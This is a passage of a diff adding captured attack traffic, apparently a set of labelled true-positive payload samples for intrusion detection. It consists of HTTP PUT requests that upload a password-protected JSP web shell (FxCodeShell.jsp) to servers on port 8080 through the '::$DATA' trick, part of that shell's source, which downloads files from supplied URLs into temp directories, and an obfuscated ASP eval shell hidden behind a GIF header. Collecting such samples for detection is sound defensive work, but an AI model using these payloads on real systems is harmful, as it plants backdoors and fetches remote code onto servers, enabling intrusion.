+		} catch (Exception e2) {
+			e2.printStackTrace();
+		}
+	}
+%>
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.77:8080
+
+
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.252:8080
+
+
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.77:8080
+
+<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS + "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "C:/Windows/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream 
+------end--------
+
+-------정탐-전체페이로드2.csv-------
+PUT /typws93799.txt HTTP/1.1
+Connection: Keep-Alive
+Content-Type: text/plain; Charset=UTF-8
+Accept: */*
+Host: www.myhome.go.kr
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+Content-Length: 96
+
+GIf89a
+<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("pochen"))%>
+------end--------
+
